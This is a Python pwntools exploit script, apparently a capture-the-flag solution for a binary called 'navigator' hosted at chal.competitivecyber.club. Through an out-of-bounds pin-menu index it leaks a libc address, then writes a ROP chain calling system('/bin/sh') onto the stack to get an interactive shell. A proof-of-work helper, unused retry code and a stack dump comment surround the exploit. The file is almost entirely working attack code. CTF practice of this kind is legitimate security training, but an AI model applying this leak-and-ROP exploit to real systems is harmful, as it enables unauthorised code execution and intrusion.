from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./navigator"
exe_args = []
io: process = None
PREFIX = b">> "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("chal.competitivecyber.club", 8887)

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)
show_leak = lambda a, b: success("%s: %#018x" % (a, b))

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
# tries_prog = log.progress("Tries")
def exploit():
    def set_pin(index, value):
        choice(1)
        choice(index)
        sprefix(chr(value).encode("iso-8859-1"))
    def show_pin(index):
        choice(2)
        choice(index)
        leak = recvu(b"\n\n ")
        return u8(getb(leak, b"Pin:\n", b"\n\n "))
    def quit():
        choice(3)

    def show64(index):
        acc = 0
        for i in range(8):
            acc |= show_pin(index+i) << (i*8)
        return acc
    
    def set_data(data, offset):
        for i in range(len(data)):
            set_pin(offset+i, data[i])

    libc.address = show64(-0x88) - 0x43654
    show_leak("libc", libc.address)

    pop_rdi = libc.address + 0x000000000002a3e5
    payload = flat([
        pop_rdi,
        binsh(),
        libc.sym.do_system+2,
    ])
    set_data(payload, 0x158)

    quit()

    io.interactive()
    input("end")
    exit()

launch()
exploit()
exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)

"""
0x0 0x5858585858585858
0x8 0x0
0x10 0xa32
0x18 0x200000140
0x20 0x0
0x28 0x5555555555cc
0x30 0x7fffffffdcf0
0x38 0x8abcb2d0fe828700
0x40 0x7ffff7ffd040
0x48 0x555555557d90
0x50 0x55000a38372d
0x58 0x7fffffffffa8
0x60 0x7fffffffdcf0
0x68 0x7fffffffdba0
0x70 0x0
0x78 0x55555555537c
0x80 0x555555557d90
0x88 0x7ffff7c43654
0x90 0x7ffff7ffd040
0x98 0x555555557d90
0xa0 0x5555555554f5
0xa8 0x7fffffffde08
0xb0 0x7fffffffdb70
0xb8 0x0
0xc0 0x0
0xc8 0xffffffffffffffff
0xd0 0x1f705aaa0
0xd8 0x0
0xe0 0xe
0xe8 0x0
0xf0 0x1f7e1ab24
0xf8 0x7fffffffdb50
"""